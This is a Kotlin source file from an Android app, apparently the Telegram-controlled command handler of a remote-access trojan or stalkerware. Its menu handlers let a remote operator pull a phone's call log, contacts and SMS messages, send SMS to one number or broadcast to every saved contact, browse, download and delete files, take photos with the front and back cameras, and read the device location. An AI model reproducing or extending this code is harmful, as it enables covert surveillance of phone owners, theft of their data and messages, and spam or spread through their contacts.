package com.fasonbot.app.bot

import android.content.Context
import android.util.Log
import com.fasonbot.app.action.CommandExecutor
import com.fasonbot.app.config.DeviceManager

class CallbackHandler(
    private val context: Context,
    private val commandExecutor: CommandExecutor
) {

    companion object {
        private const val TAG = "CallbackHandler"
        private const val DELIMITER = ":"
    }

    private val stateManager = StateManager(context)
    private val keyboardBuilder = KeyboardBuilder()

    fun handle(callbackId: String, data: String, messageId: Int?, bot: TelegramBot) {
        try {
            Log.d(TAG, "Callback: $data")
            val parts = data.split(DELIMITER)
            val action = parts.getOrNull(0) ?: return
            val targetDeviceId = parts.getOrNull(1) ?: ""
            val extraData = if (parts.size > 2) parts.subList(2, parts.size).joinToString(DELIMITER) else ""
            Log.d(TAG, "Action: $action, DeviceId: $targetDeviceId, Extra: $extraData")
            when (action) {
                Cb.DEVICE -> handleDeviceSelected(targetDeviceId, messageId, bot)
                Cb.CALLS -> handleCalls(targetDeviceId, messageId, bot)
                Cb.CONTACTS -> handleContacts(targetDeviceId, messageId, bot)
                Cb.MESSAGES -> handleMessages(targetDeviceId, messageId, bot)
                Cb.SEND_SMS -> handleSendSmsMenu(targetDeviceId, messageId, bot)
                Cb.SMS_SPECIFIC -> handleSmsSpecific(targetDeviceId, messageId, bot)
                Cb.SMS_ALL -> handleSmsAll(targetDeviceId, messageId, bot)
                Cb.BROWSE -> handleBrowseDirectory(targetDeviceId, extraData, messageId, bot)
                Cb.FILE_DL -> handleFileDownload(targetDeviceId, extraData, messageId, bot)
                Cb.FILE_DEL -> handleFileDelete(targetDeviceId, extraData, messageId, bot)
                Cb.FOLDER_DL -> handleFolderDownload(targetDeviceId, extraData, messageId, bot)
                Cb.FOLDER_DEL -> handleFolderDelete(targetDeviceId, extraData, messageId, bot)
                // Camera
                Cb.CAMERA -> handleCameraMenu(targetDeviceId, messageId, bot)
                Cb.CAM_BACK -> handleCaptureBackCamera(targetDeviceId, messageId, bot)
                Cb.CAM_FRONT -> handleCaptureFrontCamera(targetDeviceId, messageId, bot)
                Cb.CAM_BOTH -> handleCaptureBothCameras(targetDeviceId, messageId, bot)
                // Location
                Cb.LOCATION -> handleLocationMenu(targetDeviceId, messageId, bot)
                Cb.LOC_GET -> handleGetLocation(targetDeviceId, messageId, bot)
                // Navigation
                Cb.BACK_DEV -> handleBackToDevices(messageId, bot)
                Cb.BACK_MENU -> handleBackToMenu(targetDeviceId, messageId, bot)
                Cb.CANCEL -> handleCancelOperation(messageId, bot)
            }
            bot.answerCallbackQuery(callbackId)
        } catch (e: Exception) {
            Log.e(TAG, "Callback error: ${e.message}")
        }
    }

    private fun handleDeviceSelected(deviceId: String, messageId: Int?, bot: TelegramBot) {
        val device = DeviceManager.getRegisteredDevices(context).find { it.deviceId == deviceId }
        if (device == null) {
            bot.answerCallbackQuery("Device not found")
            return
        }
        stateManager.saveStateData("current_device_id", deviceId)
        bot.editMessageText(
            messageId,
            buildString {
                append("📱 <b>${device.deviceName}</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("Select an action:")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getCommandMenuButtons(deviceId)
            )
        )
    }

    private fun handleCalls(deviceId: String, messageId: Int?, bot: TelegramBot) {
        bot.editMessageText(
            messageId,
            "📞 <b>Fetching Call Log</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("❌ Cancel" to "${Cb.BACK_MENU}:$deviceId"))
            )
        )
        if (DeviceManager.isThisDevice(context, deviceId)) {
            commandExecutor.executeGetCallLog()
        }
    }

    private fun handleContacts(deviceId: String, messageId: Int?, bot: TelegramBot) {
        bot.editMessageText(
            messageId,
            "👥 <b>Fetching Contacts</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("❌ Cancel" to "${Cb.BACK_MENU}:$deviceId"))
            )
        )
        if (DeviceManager.isThisDevice(context, deviceId)) {
            commandExecutor.executeGetContacts()
        }
    }

    private fun handleMessages(deviceId: String, messageId: Int?, bot: TelegramBot) {
        bot.editMessageText(
            messageId,
            "💬 <b>Fetching Messages</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("❌ Cancel" to "${Cb.BACK_MENU}:$deviceId"))
            )
        )
        if (DeviceManager.isThisDevice(context, deviceId)) {
            commandExecutor.executeGetSmsMessages()
        }
    }

    private fun handleSendSmsMenu(deviceId: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        bot.editMessageText(
            messageId,
            buildString {
                append("📤 <b>Send SMS</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("Choose an option:")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getSmsSubMenuButtons(deviceId)
            )
        )
    }

    private fun handleSmsSpecific(deviceId: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        bot.editMessageText(
            messageId,
            buildString {
                append("📱 <b>Send SMS to Number</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("Enter the phone number:\n\n")
                append("<i>Example: +1234567890</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("❌ Cancel" to "${Cb.BACK_MENU}:$deviceId"))
            )
        )
        stateManager.saveState("awaiting_sms_number")
    }

    private fun handleSmsAll(deviceId: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        bot.editMessageText(
            messageId,
            buildString {
                append("📢 <b>Broadcast SMS</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("Enter the message to send to all contacts:\n\n")
                append("<i>⚠️ This will send SMS to all saved contacts</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("❌ Cancel" to "${Cb.BACK_MENU}:$deviceId"))
            )
        )
        stateManager.saveState("awaiting_broadcast")
    }

    private fun handleBrowseDirectory(deviceId: String, path: String, messageId: Int?, bot: TelegramBot) {
        Log.d(TAG, "handleBrowseDirectory: deviceId=$deviceId, path=$path")
        stateManager.saveStateData("current_device_id", deviceId)
        stateManager.saveStateData("file_browser_path", path)
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>\n\n" +
                "<i>Cannot browse files on remote device.</i>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        val files = commandExecutor.fileExecutor.getFileList(path)
        val displayPath = commandExecutor.fileExecutor.getDisplayPath(path)
        Log.d(TAG, "Files found: ${files.size}, displayPath: $displayPath")
        if (files.isEmpty()) {
            bot.editMessageText(
                messageId,
                buildString {
                    append("📁 <b>File Manager</b>\n")
                    append("━━━━━━━━━━━━━━━━━━\n\n")
                    append("📂 <code>$displayPath</code>\n\n")
                    append("<i>Empty folder or access denied</i>")
                },
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        val message = buildString {
            append("📁 <b>File Manager</b>\n")
            append("━━━━━━━━━━━━━━━━━━\n\n")
            append("📂 <code>$displayPath</code>\n\n")
            append("📁 Tap to browse\n")
            append("📥 Download file/folder\n")
            append("🗑️ Delete")
        }
        bot.editMessageText(
            messageId,
            message,
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getFileBrowserButtons(files, deviceId, path)
            )
        )
    }

    private fun handleFileDownload(deviceId: String, path: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        val parentPath = path.substringBeforeLast("/")
        bot.editMessageText(
            messageId,
            buildString {
                append("📥 <b>Downloading File</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("📄 <code>/$path</code>\n\n")
                append("<i>Please wait...</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.BROWSE}:$deviceId:$parentPath"))
            )
        )
        commandExecutor.executeDownloadFile(path)
    }

    private fun handleFileDelete(deviceId: String, path: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        val parentPath = path.substringBeforeLast("/")
        bot.editMessageText(
            messageId,
            buildString {
                append("🗑️ <b>Deleting File</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("📄 <code>/$path</code>\n\n")
                append("<i>Please wait...</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.BROWSE}:$deviceId:$parentPath"))
            )
        )
        commandExecutor.executeDeleteFile(path)
    }

    private fun handleFolderDownload(deviceId: String, path: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        val parentPath = path.substringBeforeLast("/")
        bot.editMessageText(
            messageId,
            buildString {
                append("📥 <b>Downloading Folder</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("📁 <code>/$path</code>\n\n")
                append("<i>Downloading all files...</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.BROWSE}:$deviceId:$parentPath"))
            )
        )
        commandExecutor.executeDownloadFile(path)
    }

    private fun handleFolderDelete(deviceId: String, path: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        val parentPath = path.substringBeforeLast("/")
        bot.editMessageText(
            messageId,
            buildString {
                append("🗑️ <b>Deleting Folder</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("📁 <code>/$path</code>\n\n")
                append("<i>Deleting all contents...</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.BROWSE}:$deviceId:$parentPath"))
            )
        )
        commandExecutor.executeDeleteFile(path)
    }

    // Camera handlers
    private fun handleCameraMenu(deviceId: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        bot.editMessageText(
            messageId,
            buildString {
                append("📷 <b>Camera Capture</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("Choose a camera to capture:")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getCameraSubMenuButtons(deviceId)
            )
        )
    }

    private fun handleCaptureBackCamera(deviceId: String, messageId: Int?, bot: TelegramBot) {
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        bot.editMessageText(
            messageId,
            "📷 <b>Capturing Back Camera</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.CAMERA}:$deviceId"))
            )
        )
        commandExecutor.executeCaptureBackCamera()
    }

    private fun handleCaptureFrontCamera(deviceId: String, messageId: Int?, bot: TelegramBot) {
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        bot.editMessageText(
            messageId,
            "📷 <b>Capturing Front Camera</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.CAMERA}:$deviceId"))
            )
        )
        commandExecutor.executeCaptureFrontCamera()
    }

    private fun handleCaptureBothCameras(deviceId: String, messageId: Int?, bot: TelegramBot) {
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        bot.editMessageText(
            messageId,
            "📷 <b>Capturing Both Cameras</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.CAMERA}:$deviceId"))
            )
        )
        commandExecutor.executeCaptureBothCameras()
    }

    // Location handlers
    private fun handleLocationMenu(deviceId: String, messageId: Int?, bot: TelegramBot) {
        stateManager.saveStateData("current_device_id", deviceId)
        bot.editMessageText(
            messageId,
            buildString {
                append("📍 <b>Location</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("Choose an action:")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getLocationSubMenuButtons(deviceId)
            )
        )
    }

    private fun handleGetLocation(deviceId: String, messageId: Int?, bot: TelegramBot) {
        if (!DeviceManager.isThisDevice(context, deviceId)) {
            bot.editMessageText(
                messageId,
                "❌ <b>Remote Access Unavailable</b>",
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
                )
            )
            return
        }
        bot.editMessageText(
            messageId,
            "📍 <b>Getting Location</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                listOf(listOf("◀️ Back" to "${Cb.LOCATION}:$deviceId"))
            )
        )
        commandExecutor.executeGetLocation()
    }

    private fun handleBackToDevices(messageId: Int?, bot: TelegramBot) {
        bot.editMessageText(
            messageId,
            "⚡ <b>Select Device</b>\n\nChoose a device:",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getDeviceSelectionButtons(context)
            )
        )
    }

    private fun handleBackToMenu(deviceId: String, messageId: Int?, bot: TelegramBot) {
        val device = DeviceManager.getRegisteredDevices(context).find { it.deviceId == deviceId }
        if (device != null) {
            bot.editMessageText(
                messageId,
                buildString {
                    append("📱 <b>${device.deviceName}</b>\n")
                    append("━━━━━━━━━━━━━━━━━━\n\n")
                    append("Select an action:")
                },
                parseMode = "HTML",
                replyMarkup = keyboardBuilder.createInlineKeyboard(
                    keyboardBuilder.getCommandMenuButtons(deviceId)
                )
            )
        }
    }

    private fun handleCancelOperation(messageId: Int?, bot: TelegramBot) {
        stateManager.clearState()
        val deviceId = stateManager.getStateData("current_device_id")
        if (deviceId.isNotEmpty()) {
            val device = DeviceManager.getRegisteredDevices(context).find { it.deviceId == deviceId }
            if (device != null) {
                bot.editMessageText(
                    messageId,
                    buildString {
                        append("📱 <b>${device.deviceName}</b>\n")
                        append("━━━━━━━━━━━━━━━━━━\n\n")
                        append("Select an action:")
                    },
                    parseMode = "HTML",
                    replyMarkup = keyboardBuilder.createInlineKeyboard(
                        keyboardBuilder.getCommandMenuButtons(deviceId)
                    )
                )
            }
        }
    }
}
